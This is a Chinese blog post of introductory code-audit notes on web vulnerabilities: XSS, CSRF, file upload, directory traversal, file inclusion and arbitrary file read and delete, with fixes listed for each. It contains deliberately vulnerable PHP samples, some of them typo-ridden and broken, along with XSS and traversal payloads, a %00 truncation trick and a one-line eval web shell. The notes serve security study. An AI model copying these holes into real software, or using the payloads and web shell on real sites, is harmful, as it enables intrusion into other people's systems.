<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将前端获取的内容，直接输出到浏览器页面		?content=123&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">HTML标签		先闭合标签	?content=123&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;标签		先闭合单引号、再闭合标签		?content=123&apos;;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563283530673.png" alt="1563283530673">（感觉有点像二次注入，被搜索时触发，管理员刷新留言板时）</p>
<p>（XSS平台）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss = $_POST[<span class="string">'xss'</span>];</span><br><span class="line">$connection = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line"><span class="keyword">if</span> ($xss !==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"INSET INTO xss(id.payload) VALUES('1','$xss');"</span>;</span><br><span class="line">    $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"fail"</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method =<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type =<span class="string">"text"</span> name=<span class="string">"xss"</span>&gt;</span><br><span class="line">    &lt;input type = <span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connect = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line">$sql = <span class="string">"select payload from xss where id = 1"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;	&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284488840.png" alt="1563284488840"></p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284525211.png" alt="1563284525211"></p>
<p>DOM可为存储型，可为反射型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。</span><br><span class="line">可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</span><br><span class="line">也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</span><br></pre></td></tr></table></figure>

<p>修改了HTML内容，从而执行了XSS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$xss = $_GET[<span class="string">'XSS'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $xss;?&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">	var text = document.getElementById("text");</span><br><span class="line">    var print = document.getElementById("print");</span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ?xss = &lt;img src=x onerror = alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改后：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror = alert(/xss/)&gt;"</span> <span class="attr">type</span> =<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span> = <span class="string">"alert(/xss/)"</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">	var text = document.getElementById("text");</span><br><span class="line">    var print = document.getElementById("print");</span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DOM-XSS 的 数据流向是： URL–&gt;浏览器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS的防御方法：DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</span><br><span class="line">（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。</span><br><span class="line">https://www.jianshu.com/p/190dedd585f2</span><br></pre></td></tr></table></figure>

<p>XSS修复方案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对所有输入中的script、iframe等字样进行严格的检查</span><br><span class="line"></span><br><span class="line">验证数据的类型及其格式、长度、范围和内容</span><br><span class="line"></span><br><span class="line">客户端做数据的验证与过滤，关键的过滤步骤在服务端进行</span><br><span class="line"></span><br><span class="line">检查输出的数据</span><br></pre></td></tr></table></figure>

<h3 id="CSRF漏洞（最容易被忽略）"><a href="#CSRF漏洞（最容易被忽略）" class="headerlink" title="CSRF漏洞（最容易被忽略）"></a>CSRF漏洞（最容易被忽略）</h3><p>跨站请求伪造。</p>
<p>黑客伪造用户的HTTP请求，将这个请求发送给存在CSRF的网站，有CSRF的网站执行了伪造的HTTP请求，就引发了跨站请求伪造。</p>
<p>漏洞危害</p>
<p>攻击者盗用你的身份信息，以你的名义发送恶意请求，发送邮件、消息，盗取账号，购买商品，虚拟货币转账。        -&gt;个人隐私泄露和财产安全。</p>
<p>漏洞本质</p>
<p>攻击者获取到重要参数，成功构造一个伪造请求</p>
<p>挖掘思路</p>
<p>后台功能模块：管理后台，会员中心、添加用户</p>
<p>被引用的核心文件里没有验证token和referer相关的代码</p>
<p>没有token：可以直接请求这个页面</p>
<p>没带referer：返回相同的数据</p>
<p>任意用户注册代码案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标存在CSRF漏洞</span><br><span class="line">受害者需要保持目标站点的活跃状态</span><br><span class="line">受害者需要点击钓鱼链接</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(admin,$conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GB2332"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;用户登录&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击登录"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"illegal"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE usename="</span>$usename<span class="string">" and password="</span>$usename<span class="string">";</span></span><br><span class="line"><span class="string">$result = mysql_query($sql) or die("</span>fail<span class="string">",mysql_error());</span></span><br><span class="line"><span class="string">if($row = mysql_fetch_array($result))&#123;</span></span><br><span class="line"><span class="string">	session_start();</span></span><br><span class="line"><span class="string">	$_SESSION['usename']=$row['usename'];</span></span><br><span class="line"><span class="string">	echo $_SESSION['usename']."</span> welcome!<span class="string">";</span></span><br><span class="line"><span class="string">	echo '&lt;a href="</span>register<span class="string">"&gt;添加用户&lt;/a&gt;'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;会员注册&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            注册用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点用户添加"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'usename'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>请登录用户<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>)</span><br><span class="line">$sql = <span class="string">"INSERT INTO admin(username,password) VALUES($usename,$password)"</span>;</span><br><span class="line"><span class="keyword">if</span>($res_insert)&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>fail<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>success<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录后才能注册，抓包，生成CSRF，保存，发给管理员，（管理员是已登录状态，所以可以注册），管理员点击，带着自己的cookie，成功的注册了一个你想要的账号。</p>
<p>修复方案：</p>
<p>验证码</p>
<p>添加Referer验证        页面逻辑</p>
<p>添加Token验证（放入cookie中）        真随机算法生成器，以致攻击者无法构造完整的url，</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务器命令的能力。问题在于服务器怎么处理、解释文件。</p>
<p>漏洞条件：</p>
<p>文件可上传</p>
<p>文件上传路径</p>
<p>文件可被访问、执行</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563348454917.png" alt="1563348454917"></p>
<p>挖掘思路：</p>
<p>上传调用同一个上传类，直接全局搜索上传函数</p>
<p>黑盒寻找上传点，代码定位</p>
<p>代码案例</p>
<p>name：客户端的原始上传文件名称</p>
<p>Type： 上传文件的MIME类型</p>
<p>Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
<p>Error：上传文件时的错误信息</p>
<p>Size：上传文件的大小，单位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8&quot;);</span><br><span class="line">$upload_dir = &quot;E:\Local test\WWW\upload&quot;;</span><br><span class="line">if(!isset($_FILES[&apos;file&apos;])&#123;</span><br><span class="line">    $upload_name = $upload_dir.&quot;\\&quot;.$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    move_upload_file($_FILES[&apos;file&apos;][&apos;temp_name&apos;]，$upload_name);</span><br><span class="line">    echo &quot;Type: &quot;.$_FILE[&apos;file&apos;][&apos;type&apos;].&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;Size: &quot;.($_FILE[&apos;file&apos;][&apos;size&apos;]/1024).&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;name: &quot;.($_FILE[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;</span><br><span class="line">              &lt;title&gt;Tilte&lt;/head&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">        &lt;form action =&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;input type =&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot;name=&quot;4096&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&apos;c&apos;]);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>文件上传绕过-客户端</p>
<p>1.将form表单中的onsubmit事件删除</p>
<p>2.拦截数据包，修改拓展名</p>
<p>文件上传绕过-服务端</p>
<p>1.黑白名单过滤</p>
<p>2.修改MIME乐行</p>
<p>3.截断上传攻击</p>
<p>4..htaccess文件攻击</p>
<p>5.目录验证</p>
<p>修复方案</p>
<p>1.检测文件上传内容，黑白名单验证，检测文件拓展名</p>
<p>​                                    MIME验证，检测文件的MIME类型</p>
<p>2.限制文件大小</p>
<p>3.更改临时文件夹的路径</p>
<p>4.读取上传文件的绝对路径与文件名称  过滤./    ../， 目录穿越</p>
<p>5.隐藏文件路径，文件名随机</p>
<h3 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h3><p>文件操作漏洞    </p>
<ol>
<li>文件上传</li>
<li>目录穿越</li>
<li>文件包含</li>
<li>文件读取</li>
<li>文件下载以及删除</li>
</ol>
<p>目录穿越：在Web应用程序所在的根目录以外的文件夹上，任意的存取被限制的文件夹、执行命令或查找数据，目录穿越攻击。</p>
<p>代码案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">"file/"</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;?file=1.txt</span><br><span class="line">&gt;&gt;?file=../2.txt</span><br></pre></td></tr></table></figure>

<p>绕过方式</p>
<p>URL编码，16位Unicode编码，双倍URL编码，超长UTF-8 Unicode编码</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563354832317.png" alt="1563354832317"></p>
<p>修复方案：</p>
<ol>
<li>在URL内不要使用文件名作为参数</li>
<li>检查文件名是否有..</li>
<li>在php.ini文件中设置open_basedir来制定文件的目录</li>
<li>使用realpath函数来展开文件路劲中的”./“,”../“等字符，然后返回绝对路径名称</li>
<li>使用basename函数来返回不包含路径的文件名称</li>
</ol>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>由于传入的文件名没有经过合理的校验，导致意外的文件泄露甚至代码注入</p>
<p>危害</p>
<p>执行恶意代码</p>
<p>包含恶意文件控制网站、网站服务器</p>
<p>本地包含    LFI</p>
<p>包含本机文件，该漏洞允许攻击者操纵输入数据、注入路径遍历字符。包含web服务器的其他文件</p>
<p>远程包含    RFI</p>
<p>远程文件包含需要设置allow_url_include =On 四个文件都支持HTTP、FTP等协议，</p>
<p>挖掘思路</p>
<p>模块加载、cache调用，传入的参数拼接包含路径</p>
<p>include()</p>
<p>include_once()</p>
<p>require()</p>
<p>require_once()</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563355377723.png" alt="1563355377723"></p>
<p>本地文件包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../file/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>远程文件包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;?file=http:127.0.0.1/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>文件名拓展名被写死，可以用%00截断，（1.jpg%00.php）</p>
<p>远程包含利用方式</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563356062805.png" alt="1563356062805"></p>
<p>修复方案</p>
<p>关闭远程包含参数开关</p>
<p>allow_url_include =Off</p>
<p>设置类似白名单的方法，筛选固定文件名</p>
<p>常见目录穿越字符进行过滤，若”./“,”../“,”..&quot;</p>
<p>觉着还可以过滤一下 %00 这个危险截断符    （但是\x00的截断在php&gt;5.3.4就没用了，）</p>
<h3 id="任意文件读取以及删除（修改）"><a href="#任意文件读取以及删除（修改）" class="headerlink" title="任意文件读取以及删除（修改）"></a>任意文件读取以及删除（修改）</h3><p>正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563367306026.png" alt="1563367306026"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($filename))&#123;</span><br><span class="line"><span class="number">1.</span>  readfile($filename);		<span class="comment">//目录穿越一波？</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>  $fp = fopen($filename,mode=<span class="string">'r'</span>) <span class="keyword">or</span> (<span class="string">"fail"</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;					<span class="comment">//感觉跟文件包含差不多23333,文件包含是利用，文件读取就读内容</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>  <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以将路劲遍历序列放入文件名内，从当前位置向上回溯，从而浏览整个浏览器的任何文件</p>
<p>任意文件删除</p>
<p>unlink()函数</p>
<p>同任意文件读取，函数不同而已。</p>
<p>修复方案：</p>
<ol>
<li><p>正则严格判断用户输入参数的格式</p>
</li>
<li><p>检查使用者的文件名是否有“..”的目录阶层字符</p>
</li>
<li><p>在php.ini文件中设置open_basedir来限定文件访问的范围</p>
</li>
</ol>
